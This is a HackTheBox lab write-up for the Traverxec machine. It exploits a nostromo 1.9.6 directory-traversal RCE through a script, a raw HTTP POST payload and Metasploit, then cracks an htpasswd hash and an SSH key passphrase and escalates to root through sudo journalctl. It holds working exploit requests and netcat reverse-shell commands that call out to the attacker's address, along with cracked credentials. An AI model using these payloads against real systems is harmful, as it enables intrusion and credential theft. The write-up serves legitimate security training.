---
title: HackTheBox - Traverxec
categories: [HackTheBox, HackTheBox - Linux]
date: 2022-09-25
tags: [linux-priv-esc/sudo/gtfo-bin]
img_path: /Writeups/HackTheBox/Linux/Traverxec/images/
image:
  src: Pasted%20image%2020220925012208.png
  width: 1000   # in pixels
  height: 400   # in pixels
---


# Overview 
This machine begins w/ a web enumeration, discovering that the webserver is running `nostromo 1.9.6` which is susceptible to a directory traversal that leads to RCE vulnerability due to insufficient input sanitization, allowing us to obtain a low-privilege/`www-data` user.

For the privilege escalation part, we have to privilege escalate to `david` and then `root`. After enumerating the system, `nostromo` configuration file reveals that `homedirs: /home` & `homedirs_public: /public_www` is defined, meaning we have access to the home directory (`/<user>/public_www`) of users on the system through HTTP via `http://traverxec.htb/~<USER>/`. Since `david` is the only user, we know that `/home/david/public_www` exists, `public_www` directory contains a backup of `david` SSH encrypted SSH private key, after cracking it w/ `john`, we are able to SSH into `david` by specifying his SSH private key.

On user `david`'s home directory, there is a script that reveals that user `david` is allowed to execute `/usr/bin/journalctl -n5 -unostromo.service` as root. `journalctl` has a GTFOBins entry, allowing us to privilege escalate to `root` w/ `!/bin/sh`.


---

| Column       | Details      |
| ------------ | ------------ |
| Box Name     | Traverxec    |
| IP           | 10.10.10.165 |
| Points       | 20           |
| Difficulty   |    Easy          |
| Creator      |    [jkr](https://www.hackthebox.com/home/users/profile/77141)           |
| Release Date | 16 Nov 2019             |


# Recon

## TCP/80 (HTTP)
- FFUF
	```bash
	                        [Status: 200, Size: 15674, Words: 3910, Lines: 401, Duration: 39ms]
	css                     [Status: 301, Size: 315, Words: 19, Lines: 14, Duration: 36ms]
	icons                   [Status: 301, Size: 315, Words: 19, Lines: 14, Duration: 35ms]
	img                     [Status: 301, Size: 315, Words: 19, Lines: 14, Duration: 34ms]
	index.html              [Status: 200, Size: 15674, Words: 3910, Lines: 401, Duration: 34ms]
	js                      [Status: 301, Size: 315, Words: 19, Lines: 14, Duration: 35ms]
	lib                     [Status: 301, Size: 315, Words: 19, Lines: 14, Duration: 36ms]
	:: Progress: [4615/4615] :: Job [1/1] :: 54 req/sec :: Duration: [0:04:41] :: Errors: 285 ::
	```



# Initial Foothold

## TCP/80 (HTTP) - nostromo/nhttpd 1.9.6 RCE
1. Found out that `nostromo 1.9.6/nhttpd 1.9.6` webserver is running
	![](Pasted%20image%2020220925014140.png)
2. Search exploits for `nostromo 1.9.6`
	
	| Exploit Title                                                        | Path                     |
	| -------------------------------------------------------------------- | ------------------------ |
	| Nostromo - Directory Traversal Remote Command Execution (Metasploit) | multiple/remote/47573.rb |
	| nostromo 1.9.6 - Remote Code Execution                               | multiple/remote/47837.py |
	| nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution | linux/remote/35466.sh    |
3. How does `nostromo 1.9.6 - Remote Code Execution` - (`multiple/remote/47837.py`) work?
	- Due to the lack of input sanitization, there is a directory traversal vulnerability in the function `http_verify`, attackers can include `/bin/sh` to do remote code execution.
	- Carriage returns (`\r, %0d`) is used to bypass the input sanitization of `/../` (Directory Traversal), allowing attackers to include `/bin/sh` to execude code.
	- [More Info](https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html)
4. Try `nostromo 1.9.6 - Remote Code Execution` - (`multiple/remote/47837.py`)
	1. Run exploit
		```
		┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
		└─# python2 47837.py traverxec.htb 80 'id;whoami'
		
		HTTP/1.1 200 OK
		Date: Sat, 24 Sep 2022 17:48:31 GMT
		Server: nostromo 1.9.6
		Connection: close
		
		
		uid=33(www-data) gid=33(www-data) groups=33(www-data)
		www-data
		```
	2. Start `netcat` listener
		```
		┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
		└─# nc -nvlp 4444
		Ncat: Version 7.92 ( https://nmap.org/ncat )
		Ncat: Listening on :::4444
		Ncat: Listening on 0.0.0.0:4444
		```
	3. Invoke reverse shell
		```
		┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
		└─# python2 47837.py traverxec.htb 80 'nc 10.10.14.14 4444 -e /bin/bash'
		```
		![](Pasted%20image%2020220925015312.png)


## TCP/80 (HTTP) - nostromo/nhttpd 1.9.6 RCE (Manual)
1. How does `nostromo 1.9.6 - Remote Code Execution` work?
	- Due to the insufficient  input sanitization, there is a directory traversal vulnerability in the function `http_verify`, attackers can include `/bin/sh` to do remote code execution.
	- Carriage returns (`\r, %0d`) is used to bypass the input sanitization of `/../` (Directory Traversal), allowing attackers to include `/bin/sh` to execude code.
	- [More Info](https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html)
2. Check if RCE is working
	```
	POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1
	Host: 10.10.10.165
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44
	Content-Length: 53
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 53
	Connection: close
	
	echo
	echo
	bash -c "id;whoami" | nc 10.10.14.14 4444
	```
	![](Pasted%20image%2020220925170508.png)
	>Executed code is not reflected on the webpage, we have to pip `|` the executed commands into `netcat` to view it.
	{: .prompt-info }
2. Start `netcat` listener
	```
	┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
	└─# nc -nvlp 4444
	Ncat: Version 7.92 ( https://nmap.org/ncat )
	Ncat: Listening on :::4444
	Ncat: Listening on 0.0.0.0:4444
	Ncat: Connection from 10.10.10.165.
	```
3. Invoke reverse shell
	```
	POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1
	Host: 10.10.10.165
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44
	Content-Length: 55
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 55
	Connection: close
	
	echo
	echo
	bash -c "nc 10.10.14.14 4444 -e /bin/bash" 
	```
4. Demo - nostromo 1.9.6 RCE
	![](19CaxMPgGy.gif)


## TCP/80 (HTTP) - nostromo/nhttpd 1.9.6 RCE (Metasploit)
1. Launch `msfconsole`
2. Search for `nhttpd`
	```
	msf6 > search nhttpd
	
	Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nostromo_code_exec
	
	msf6 > use 0
	[*] Using configured payload cmd/unix/reverse_perl
	msf6 exploit(multi/http/nostromo_code_exec) >
	```
3. Set `OPTIONS`
	```
	msf6 exploit(multi/http/nostromo_code_exec) > set RHOSTS 10.10.10.165
	RHOSTS => 10.10.10.165
	msf6 exploit(multi/http/nostromo_code_exec) > set LHOST tun0
	LHOST => 10.10.14.14
	```
4. Exploit!
	```
	msf6 exploit(multi/http/nostromo_code_exec) > exploit
	
	[*] Started reverse TCP handler on 10.10.14.14:4444
	[*] Running automatic check ("set AutoCheck false" to disable)
	[+] The target appears to be vulnerable.
	[*] Configuring Automatic (Unix In-Memory) target
	[*] Sending cmd/unix/reverse_perl command payload
	[*] Command shell session 2 opened (10.10.14.14:4444 -> 10.10.10.165:33328 ) at 2022-09-25 05:44:11 +0800
	
	shell
	[*] Trying to find binary 'python' on the target machine
	[*] Found python at /usr/bin/python
	[*] Using `python` to pop up an interactive shell
	[*] Trying to find binary 'bash' on the target machine
	[*] Found bash at /usr/bin/bash
	id
	id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	www-data@traverxec:/usr/bin$
	```
	![](Pasted%20image%2020220925054440.png)



# Privilege Escalation

## David - Enumeration
1. Find out the location of the root web directory
	```
	www-data@traverxec:/var/nostromo/conf$ find / 2>/dev/null | grep "portfolio_01.jpg"
	/var/nostromo/htdocs/img/portfolio/portfolio_01.jpg
	```
	- `/var/nostromos`
2. View files in `/var/nostromos`
	```
	www-data@traverxec:/var/nostromo$ ls -la
	total 24
	drwxr-xr-x  6 root     root   4096 Oct 25  2019 .
	drwxr-xr-x 12 root     root   4096 Oct 25  2019 ..
	drwxr-xr-x  2 root     daemon 4096 Oct 27  2019 conf
	drwxr-xr-x  6 root     daemon 4096 Oct 25  2019 htdocs
	drwxr-xr-x  2 root     daemon 4096 Oct 25  2019 icons
	drwxr-xr-x  2 www-data daemon 4096 Sep 24 12:57 logs
	```
	- `conf` - contains `nostromos` configurations
3. View `conf/nhttpd.conf`
	```
	www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
	# MAIN [MANDATORY]
	
	servername              traverxec.htb
	serverlisten            *
	serveradmin             david@traverxec.htb
	serverroot              /var/nostromo
	servermimes             conf/mimes
	docroot                 /var/nostromo/htdocs
	docindex                index.html
	
	# LOGS [OPTIONAL]
	
	logpid                  logs/nhttpd.pid
	
	# SETUID [RECOMMENDED]
	
	user                    www-data
	
	# BASIC AUTHENTICATION [OPTIONAL]
	
	htaccess                .htaccess
	htpasswd                /var/nostromo/conf/.htpasswd
	
	# ALIASES [OPTIONAL]
	
	/icons                  /var/nostromo/icons
	
	# HOMEDIRS [OPTIONAL]
	
	homedirs                /home
	homedirs_public         public_www
	```
	- `/var/nostromo/conf/.htpasswd`
		>  Contains basic authentication credentials
		{: .prompt-info }
	- `homedirs: /home`
		>  When `homedirs` is defined, the public can access the home directory of users on the system
		>  Proceed to `http://example.com/~<Name Of User>/` to access the home directory of the specified user 
		{: .prompt-info }
	- `homedirs_public: public_www`
		>  `public_www` is a directory that exists in the user's directory
		>   When `homedirs_public` is defined, the public can only access `public_www` directory, instead of the entire home directory
		{: .prompt-info }
	- [Source](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=NHTTPD#BASIC_AUTHENTICATION)
4. Extract Hash in `.htpasswd`
	```
	www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd | cut -d ":" -f2
	$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
	```
5. Found `.htpasswd` w/ `linpeas.sh` as well
	```
	╔══════════╣ Analyzing Htpasswd Files (limit 70)
	-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd
	david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
	```

## David - Crack Hash
1. Identify the hash alogrithm
	```
	┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
	└─# nth --no-banner --file hash
	
	$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
	
	Most Likely
	MD5 Crypt, HC: 500 JtR: md5crypt
	Cisco-IOS(MD5), HC: 500 JtR: md5crypt
	FreeBSD MD5, HC: 500 JtR: md5crypt
	```
2. Crack hash w/ `hashcat`
	```
	┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
	└─# hashcat -a 0 -m 500 '$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' /usr/share/wordlists/rockyou.txt --show
	$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
	```
	- It took really long
3. Could not switch to `david` w/ `Nowonly4me`

## David - Found Backup SSH Keys
1. View files in `/home/david/public_www`
	```
	www-data@traverxec:/home/david/public_www$ find .
	.
	./index.html
	./protected-file-area
	./protected-file-area/backup-ssh-identity-files.tgz
	./protected-file-area/.htaccess
	www-data@traverxec:/home/david/public_www$
	```
	- `backup-ssh-identity-files.tgz`
2. Copy `backup-ssh` to `/tmp` & extract it
	```
	www-data@traverxec:/tmp$ cp backup-ssh-identity-files.tgz /tmp
	
	www-data@traverxec:/tmp$ tar -xf  backup-ssh-identity-files.tgz -v
	home/david/.ssh/
	home/david/.ssh/authorized_keys
	home/david/.ssh/id_rsa
	home/david/.ssh/id_rsa.pub
	www-data@traverxec:/tmp$
	```
4. Decrypt encrypted `id_rsa`
	```
	┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/loot]
	└─# ssh2john id_rsa > john_id_rsa
	
	┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/loot]
	└─# john --wordlist=/usr/share/wordlists/rockyou.txt john_id_rsa
	Using default input encoding: UTF-8
	Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
	Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
	Cost 2 (iteration count) is 1 for all loaded hashes
	Will run 2 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	hunter           (id_rsa)
	```
5. SSH w/ `id_rsa` & `hunter`
	```
	┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/loot]
	└─# sshpass -P 'Enter passphrase' -p 'hunter' ssh -i id_rsa david@traverxec.htb
	Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
	Last login: Sat Sep 24 16:12:21 2022 from 10.10.14.14
	david@traverxec:~$
	```


##  Root - Enumeration
1. Found a script in `david`'s home directory
	```
	david@traverxec:~/bin$ ls -la
	total 16
	drwx------ 2 david david 4096 Sep 24 16:34 .
	drwx--x--x 5 david david 4096 Sep 24 16:37 ..
	-r-------- 1 david david  802 Oct 25  2019 server-stats.head
	-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
	```
2. View contents of `server-stats.sh`
	```
	david@traverxec:~/bin$ cat server-stats.sh
	#!/bin/bash
	
	cat /home/david/bin/server-stats.head
	echo "Load: `/usr/bin/uptime`"
	echo " "
	echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
	echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
	echo " "
	echo "Last 5 journal log lines:"
	/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
	```
	- `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`
	- `/usr/bin/journalctl` - has a [GTFOBins entry](https://gtfobins.github.io/gtfobins/journalctl/#sudo)
3. Execute `server-stats.sh`, there is no password prompt, this means that `david` is able to run `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` as `root`.
	```
	david@traverxec:~/bin$ ./server-stats.sh
	Load:  17:31:48 up  2:35,  1 user,  load average: 0.00, 0.00, 0.00
	
	Open nhttpd sockets: 2
	Files in the docroot: 117
	
	Last 5 journal log lines:
	-- Logs begin at Sat 2022-09-24 14:56:34 EDT, end at Sat 2022-09-24 17:31:48 EDT. --
	Sep 24 16:50:29 traverxec sudo[13904]: www-data : command not allowed ; TTY=pts/1 ; PWD=/tmp/home/david/.ssh ; USER=root ; COMMAND=list
	Sep 24 16:50:45 traverxec sudo[13909]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/1 ruser=www-data rhost=  user=www-data
	Sep 24 16:50:48 traverxec sudo[13909]: pam_unix(sudo:auth): conversation failed
	Sep 24 16:50:48 traverxec sudo[13909]: pam_unix(sudo:auth): auth could not identify password for [www-data]
	Sep 24 16:50:48 traverxec sudo[13909]: www-data : command not allowed ; TTY=pts/1 ; PWD=/tmp/home/david/.ssh ; USER=root ; COMMAND=list
	```
	
## Root - SUDO GTFOBINS
1. How do we exploit `journalctl`
	- `journalctl` invokes the default pager, likely to be `less`. 
	- However, `-n5` is option is used, meaning only 5 lines will be displayed, since there is sufficient screen space, `less` will not be invoked.
	- In order to invoke `less` to spawn a shell, we have to resize the terminal size so that there is insufficent space, causing `less` to be invoked.
2. Exploit `journalctl`
	1. Make terminal as small as possible
	2. Spawn `root` shell
		```
		/bin/sh
		```
		![](Pasted%20image%2020220925051459.png)
1. Demo `SUDO GTFOBINS journalctl`
	![](KqccceU2oq.gif)
